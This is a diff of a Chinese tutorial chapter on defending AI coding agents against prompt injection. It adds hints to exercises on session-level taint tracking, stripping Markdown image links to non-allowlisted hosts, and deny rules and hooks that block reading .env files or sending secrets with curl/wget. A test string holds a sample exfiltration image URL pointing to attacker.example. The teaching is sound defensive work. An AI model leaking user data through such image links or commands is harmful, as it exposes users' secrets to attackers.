@@ -362,9 +362,38 @@ CLAUDE.md 里写「不要外发密钥」够不够？不够。那是上下文里�
 
 ## 练习
 
-1. 改 demo：把污点从「一次 `runAgent`」改成挂在会话对象上，第二轮用户说「把总结发给 Alice」时，`send_message` 仍然要求确认。写一个测试证明这一点。
-2. 给 demo 加一个 `render_markdown` 出口：模型最终回复里如果有指向非白名单域名的图片链接，在交给用户前把它替换成纯文本。思考：这道检查应该放在循环里，还是放在前端渲染层？
-3. 开放题：为你的 Claude Code 设计一套「拆一条腿」的方案。你愿意拆哪一条？会损失哪些日常用法？用 hook、deny 规则、subagent、出网代理中的哪些组合来实现？
+**1.** 改 demo：把污点从「一次 `runAgent`」改成挂在会话对象上，第二轮用户说「把总结发给 Alice」时，`send_message` 仍然要求确认。写一个测试证明这一点。
+
+<details>
+<summary>提示</summary>
+
+把 `run_agent` 里的局部变量 `tainted_by`（Node：`taintedBy`）挪到一个会话对象上，比如新建一个 `Session`，带 `messages` 和 `tainted_by`；`run_agent` 接收这个 session，不再每次新建 `messages`。读过 `UNTRUSTED` 里的工具就设上，整个会话期间不清除。
+
+测试照 `test_trifecta.py` 的写法，用 `fake_llm` 的 `FakeAnthropic`、`tool_use`、`text` 写两轮脚本：第一轮 `read_inbox` 然后给出总结；第二轮用户说「把总结发给 Alice」，模型调 `send_message`。不传 `confirm`，断言 `outbox == []` 且 `r.blocked == ["send_message"]`。再加一个反向用例：传一个返回 True 的 `confirm`，消息才发得出去。
+
+</details>
+
+**2.** 给 demo 加一个 `render_markdown` 出口：模型最终回复里如果有指向非白名单域名的图片链接，在交给用户前把它替换成纯文本。思考：这道检查应该放在循环里，还是放在前端渲染层？
+
+<details>
+<summary>提示</summary>
+
+写一个 `render_markdown(answer, allowed_hosts)`：用正则匹配 `![alt](url)`，`urllib.parse.urlparse(url).hostname` 不在白名单里，就换成纯文本，比如 `[图片已移除：alt]`。在 `run_agent` 返回 `RunResult` 之前对 `answer` 调一次。测试三条：`![](https://attacker.example/x.png?d=482913)` 被替换；白名单里的图片保留；普通链接（不带 `!`）不受影响。
+
+放哪：正文的说法是 Markdown 图片要在渲染层另外堵。真正发出请求的是渲染图片的那个界面，界面上还可能渲染历史记录、工具结果这些别的来源，所以最终防线应该在前端渲染层。循环里这道检查可以留着当纵深防御，但只靠它会漏。
+
+</details>
+
+**3.** 开放题：为你的 Claude Code 设计一套「拆一条腿」的方案。你愿意拆哪一条？会损失哪些日常用法？用 hook、deny 规则、subagent、出网代理中的哪些组合来实现？
+
+<details>
+<summary>提示</summary>
+
+方向：先问哪条腿你最离不开。私有数据（代码库）就是工作本身，拆不了；网页、工单、共享文档这些不可信内容天天要读，也拆不了。所以我会拆「对外通信」，但不是全拆。
+
+组合可以这样：deny 掉读密钥文件（`Read(**/.env)` 等，第 10 章给过）；PreToolUse hook 拦 Bash 里带疑似密钥的 `curl` / `wget`；PostToolUse 在 WebFetch 或浏览器类工具之后写会话级标记，之后外发类 MCP 工具（发评论、建页面）一律要确认（本章「对照你的环境」第 1 条）；读外部内容的活儿派给只读的 subagent。损失：随手 curl 调接口、让 Claude 直接回工单评论，都会多一步确认。还要诚实地写上它挡不住什么：hook 按命令文本拦，被注入后的刻意绕过，要靠出网白名单代理这种网络层手段兜底。
+
+</details>
 
 ## 延伸阅读
 
